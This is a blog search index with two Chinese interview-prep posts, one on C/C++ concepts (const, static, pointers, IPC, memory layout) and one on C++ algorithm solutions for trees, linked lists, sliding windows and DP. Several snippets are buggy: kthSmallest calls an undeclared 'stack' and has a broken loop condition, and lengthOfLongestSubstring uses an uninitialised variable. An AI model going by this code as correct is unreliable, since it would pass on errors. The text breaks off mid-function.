<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>微服务</title>
      <link href="/2023/01/24/2023-01-04-%E9%9D%A2%E8%AF%95%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
      <url>/2023/01/24/2023-01-04-%E9%9D%A2%E8%AF%95%E5%BE%AE%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>持续更新</p><a id="more"></a><h2 id="概念性区分"><a href="#概念性区分" class="headerlink" title="概念性区分"></a>概念性区分</h2><p><strong>1.C和C++的区别</strong><br>C面向过程，C++面向对象<br>C的内存管理使用malloc free，C++还可以使用new delete<br>C不支持函数重载，C++支持函数重载<br>C没有引用，C++可以用引用<br><strong>堆和栈的区别</strong><br>stack编译器自动分配和释放，自底向上的数据结构<br>heap需要由程序员手动new delete，会产生外部碎片，是自上到下的数据结构<br><strong>c++中不能被继承的成员函数</strong><br>析构函数和构造函数<br><strong>const</strong><br>定义常量<br>修饰函数参数和函数返回值</p><h2 id="修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值"><a href="#修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值" class="headerlink" title="修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值"></a>修饰函数定义体，函数为类的成员函数，const修饰后的成员函数不修改成员变量的值</h2><p>define给一个立即数，const是常量，放在静态区域，全局变量也在静态区域<br>静态区：static无论是全局变量还是局部变量都存储在全局/静态区域，在编译期就为其分配内存，在程序结束时释放<br>const的全局变量存储在只读数据段，第一次使用时被分配内存，结束时释放；const的局部变量存在栈中，代码块结束释放<br>define定义的常量不可以用指针去指向，const定义的常量可以用指针去指向该常量的地址<br>–const优点<br>const 常量有数据类型，而宏常量没有数据类型。<br>编译器可以对前者进行类型安全检查，<br>后者只进行字符替换，没有类型安全检查，并且在字符替换可能报错。<br>[全局变量放在静态存储区，整个程序开始分配内存，结束释放]<br><strong>static</strong><br>static修饰的变量只能通过其所在文件、模块或函数进行调用，限制变量<br>static修饰的变量一开始就得初始化，并存放于静态内存区<br><strong>volatile</strong><br>本条指令不会因编译器的优化而省略，不会被编译器察觉（隐藏变量），且要求每次重新读取volatile修饰的变量的内容<br><strong>extern</strong></p><p><strong>指针和引用的区别</strong><br>引用本质是只读指针，引用只能在初始化时被赋值,且必须被初始化，之后不能改变，指针是动态的<br>引用不能为NULL，指针可以<br>引用做函数参数时，内部传递的是变量地址<br><strong>进程间通信</strong><br>pipe管道，半双工，用于父子进程通信<br>semaphore信号量，进程同步访问共享资源<br>message que 消息队列，克服了缓冲区限制<br>shared memory共享内存<br>socket<br><strong>线程间通信</strong><br>全局变量   Messages消息机制；<br>CEvent对象（MFC中的一种线程通信对象，通过其触发状态的改变实现同步与通信）</p><p>编译时运算符:sizeof</p><p><strong>写一个函数指针</strong><br><em>( ( void (</em>)() ) 0x100000) ( );<br>void(<em>)()强制转换0x100000<br>typedef void(</em>)() voidFunc;<br>*(  (voidFunc)0x100000 )();</p><p><strong>内存分配方式</strong></p><p>从静态存储区域分配。内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。例如全局变量。</p><p>在栈上创建。在执行函数时，函数内局部变量的存储单元都可以在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。</p><p>从堆上分配，亦称动态内存分配。程序在运行的时候用malloc或new申请任意多少的内存，程序员自己负责在何时用free或delete释放内存。动态内存的生存期由我们决定，使用非常灵活，但问题也最多。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 微服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些算法整理</title>
      <link href="/2023/01/24/2023-01-24-%E9%9D%A2%E8%AF%95%E7%AE%97%E6%B3%95/"/>
      <url>/2023/01/24/2023-01-24-%E9%9D%A2%E8%AF%95%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>持续更新</p><a id="more"></a><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="二叉树最大直径-dfs"><a href="#二叉树最大直径-dfs" class="headerlink" title="二叉树最大直径 dfs"></a>二叉树最大直径 dfs</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">depth</span><span class="params">(TreeNode* root,<span class="keyword">int</span> &amp;res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> l = depth(root-&gt;left,res);</span><br><span class="line">        <span class="keyword">int</span> r = depth(root-&gt;right,res);</span><br><span class="line">        res = max(res, l+ r );</span><br><span class="line">        <span class="keyword">return</span> max(l,r)+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">diameterOfBinaryTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        depth(root,res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="翻转二叉树"><a href="#翻转二叉树" class="headerlink" title="翻转二叉树"></a>翻转二叉树</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">递归左右子树</span><br></pre></td></tr></table></figure><h2 id="二叉搜索树第k小的元素【没懂，记住了】"><a href="#二叉搜索树第k小的元素【没懂，记住了】" class="headerlink" title="二叉搜索树第k小的元素【没懂，记住了】"></a>二叉搜索树第k小的元素【没懂，记住了】</h2><p>迭代方法，在找到答案后停止，不需要遍历整棵树</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">kthSmallest</span><span class="params">(TreeNode* root, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">stack</span>&lt;TreeNode* &gt; nodes;</span><br><span class="line">        <span class="keyword">while</span>(root &amp;&amp; nodes.size() &gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(root)&#123;</span><br><span class="line">                <span class="built_in">stack</span>.push(root); <span class="comment">//左子树一直进栈</span></span><br><span class="line">                root = root -&gt; left;</span><br><span class="line">            &#125;</span><br><span class="line">            root = <span class="built_in">stack</span>.top();</span><br><span class="line">            <span class="built_in">stack</span>.pop();</span><br><span class="line">            k--;</span><br><span class="line">            <span class="keyword">if</span>(k==<span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">            root = root-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="判断树a是否是b的子树"><a href="#判断树a是否是b的子树" class="headerlink" title="判断树a是否是b的子树"></a>判断树a是否是b的子树</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) :</span><br><span class="line">        val(x), left(<span class="literal">NULL</span>), right(<span class="literal">NULL</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isSubtree</span><span class="params">(TreeNode* pRoot1, TreeNode* pRoot2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pRoot1 == <span class="literal">NULL</span> &amp;&amp; pRoot2 != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (pRoot2 == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (pRoot1-&gt;val != pRoot2-&gt;val)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> isSubtree(pRoot1-&gt;left, pRoot2-&gt;left) &amp;&amp; isSubtree(pRoot1-&gt;right, pRoot2-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">HasSubtree</span><span class="params">(TreeNode* pRoot1, TreeNode* pRoot2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">bool</span> result = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (pRoot1 != <span class="literal">NULL</span> &amp;&amp; pRoot2 != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pRoot1-&gt;val == pRoot2-&gt;val) &#123;</span><br><span class="line">            result = isSubtree(pRoot1, pRoot2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!result)</span><br><span class="line">            result = HasSubtree(pRoot1-&gt;left, pRoot2);</span><br><span class="line">        <span class="keyword">if</span> (!result)</span><br><span class="line">            result = HasSubtree(pRoot1-&gt;right, pRoot2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><h2 id="k个一组翻转链表"><a href="#k个一组翻转链表" class="headerlink" title="k个一组翻转链表"></a>k个一组翻转链表</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ListNode * <span class="title">reverse</span><span class="params">(ListNode* head)</span></span>&#123;</span><br><span class="line">    ListNode* pre = <span class="literal">nullptr</span>;</span><br><span class="line">    ListNode* cur = head;</span><br><span class="line">    <span class="keyword">while</span>(cur)&#123;</span><br><span class="line">        ListNode* next;</span><br><span class="line">        next = cur-&gt;next;</span><br><span class="line">        cur-&gt;next =pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        cur = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pre;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseBetween</span><span class="params">(ListNode* head, <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">        ListNode* newnode=<span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//必须要</span></span><br><span class="line">        newnode -&gt;next = head;</span><br><span class="line">        ListNode* pre = newnode;</span><br><span class="line">        <span class="comment">//先找需要翻转的前一个节点</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;left<span class="number">-1</span> ;i++)&#123;</span><br><span class="line">            pre = pre-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* cur = pre-&gt;next;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;right-left;i++)&#123;</span><br><span class="line">            ListNode* next = cur-&gt;next;</span><br><span class="line">            cur-&gt;next =next-&gt;next;</span><br><span class="line">            next-&gt;next = pre-&gt;next;</span><br><span class="line">            pre-&gt;next = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newnode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="链表相交"><a href="#链表相交" class="headerlink" title="链表相交"></a>链表相交</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">getIntersectionNode</span><span class="params">(ListNode *headA, ListNode *headB)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//哈希表</span></span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;ListNode*,<span class="keyword">int</span>&gt;mp;</span><br><span class="line">        ListNode* cur1=headA;</span><br><span class="line">        <span class="keyword">while</span>(cur1)&#123;</span><br><span class="line">            mp[cur1]++;</span><br><span class="line">            cur1=cur1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* cur2=headB;</span><br><span class="line">        <span class="keyword">while</span>(cur2)&#123;</span><br><span class="line">            <span class="keyword">if</span>(mp[cur2]) <span class="keyword">return</span> cur2;</span><br><span class="line">            cur2=cur2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a>滑动窗口</h1><h2 id="无重复的最长子串"><a href="#无重复的最长子串" class="headerlink" title="无重复的最长子串"></a>无重复的最长子串</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_set</span>&lt;<span class="keyword">char</span>&gt; appears;<span class="comment">// 判断是否重复</span></span><br><span class="line">        <span class="keyword">int</span> res;</span><br><span class="line">        <span class="keyword">int</span> pos = <span class="number">0</span>,len = s.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> left =<span class="number">0</span> ;left &lt;len;left++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(left!=<span class="number">0</span>)&#123; <span class="comment">// 只要下面的循环扫描一遍，就会来这里left++，</span></span><br><span class="line">            <span class="comment">//说明往右移走了一位，最左边字母删掉</span></span><br><span class="line">                appears.erase(s[left<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(pos &lt; len &amp;&amp; !appears.count(s[pos]))&#123;</span><br><span class="line">                appears.insert(s[pos]);</span><br><span class="line">                pos++;</span><br><span class="line">            &#125;</span><br><span class="line">            res = max(res,pos - left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="判断s中是否有字符串st的排列"><a href="#判断s中是否有字符串st的排列" class="headerlink" title="判断s中是否有字符串st的排列"></a>判断s中是否有字符串st的排列</h2><p><a href="https://leetcode.cn/problems/permutation-in-string/" target="_blank" rel="noopener">https://leetcode.cn/problems/permutation-in-string/</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkInclusion</span><span class="params">(<span class="built_in">string</span> s1, <span class="built_in">string</span> s2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = s1.length(), m = s2.length();</span><br><span class="line">    <span class="keyword">if</span> (n &gt; m) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; cnt(<span class="number">26</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        cnt[s1[i] - <span class="string">'a'</span>] -- ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> right = <span class="number">0</span>; right &lt; m; ++right) &#123;</span><br><span class="line">        <span class="keyword">int</span> x = s2[right] - <span class="string">'a'</span>;</span><br><span class="line">        cnt[x]++;</span><br><span class="line">        <span class="keyword">while</span> (cnt[x] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            cnt[s2[left] - <span class="string">'a'</span>] --;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (right - left + <span class="number">1</span> == n) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="DP"><a href="#DP" class="headerlink" title="DP"></a>DP</h1><h2 id="最长递增子序列"><a href="#最长递增子序列" class="headerlink" title="最长递增子序列"></a>最长递增子序列</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;<span class="comment">//O(n^2)</span></span><br><span class="line">    <span class="keyword">int</span> n = nums.size();</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> dp[n];<span class="comment">//dp[i]定义为num数组前i个里面最长的上升子序列长度</span></span><br><span class="line">    <span class="comment">// memset(dp,0,sizeof(dp));</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) dp[i]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> ans=dp[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;<span class="comment">//比较i前所有的数，</span></span><br><span class="line">            <span class="keyword">if</span>(nums[j]&lt;nums[i])&#123;</span><br><span class="line">                dp[i]=dp[j]+<span class="number">1</span> &gt; dp[i] ? dp[j]+<span class="number">1</span> :dp[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ans = ans &gt; dp[i]? ans:dp[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二分解法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLIS</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;<span class="comment">//O(nlog2n) 抄的评论区</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    dp[i]: 所有长度为i+1的递增子序列中, 最小的那个序列尾数.</span></span><br><span class="line"><span class="comment">    由定义知dp数组必然是一个递增数组, 可以用 maxL 来表示最长递增子序列的长度. </span></span><br><span class="line"><span class="comment">    对数组进行迭代, 依次判断每个数num将其插入dp数组相应的位置:</span></span><br><span class="line"><span class="comment">    1. num &gt; dp[maxL], 表示num比所有已知递增序列的尾数都大, 将num添加入dp</span></span><br><span class="line"><span class="comment">        数组尾部, 并将最长递增序列长度maxL加1</span></span><br><span class="line"><span class="comment">    2. dp[i-1] &lt; num &lt;= dp[i], 只更新相应的dp[i]</span></span><br><span class="line"><span class="comment">    **/</span></span><br><span class="line">    <span class="keyword">int</span> maxL = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n = nums.size();</span><br><span class="line">    <span class="keyword">int</span> dp[n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> num : nums) &#123;</span><br><span class="line">        <span class="comment">// 二分法查找, 也可以调用库函数如binary_search</span></span><br><span class="line">        <span class="keyword">int</span> low = <span class="number">0</span>, high = maxL;</span><br><span class="line">        <span class="keyword">while</span>(low &lt; high) &#123;</span><br><span class="line">            <span class="keyword">int</span> mid = low+(high-low)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(dp[mid] &lt; num)</span><br><span class="line">                low = mid+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                high = mid;</span><br><span class="line">        &#125;</span><br><span class="line">        dp[low] = num;</span><br><span class="line">        <span class="keyword">if</span>(low == maxL)</span><br><span class="line">            maxL++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="最长公共子序列"><a href="#最长公共子序列" class="headerlink" title="最长公共子序列"></a>最长公共子序列</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(<span class="built_in">string</span> text1, <span class="built_in">string</span> text2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = text1.size(),n=text2.size();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; dp(m+<span class="number">1</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(n+<span class="number">1</span>,<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(text1[i]==text2[j]) dp[i+<span class="number">1</span>][j+<span class="number">1</span>] = dp[i][j]+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> dp[i+<span class="number">1</span>][j+<span class="number">1</span>]=max(dp[i][j+<span class="number">1</span>],dp[i+<span class="number">1</span>][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="最大子数组和"><a href="#最大子数组和" class="headerlink" title="最大子数组和"></a>最大子数组和</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = nums.size();</span><br><span class="line">    <span class="keyword">int</span> dp[n];</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">    <span class="comment">//设dp[i]为num[i]结尾的前i个数中的最大和，则dp[i]=max(dp[i-1],dp[i-1]+num[i]);</span></span><br><span class="line">    dp[<span class="number">0</span>]=nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> maxn = dp[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++) &#123;</span><br><span class="line">        dp[i]=max(nums[i],dp[i<span class="number">-1</span>]+nums[i]);</span><br><span class="line">        maxn = max(maxn,dp[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> 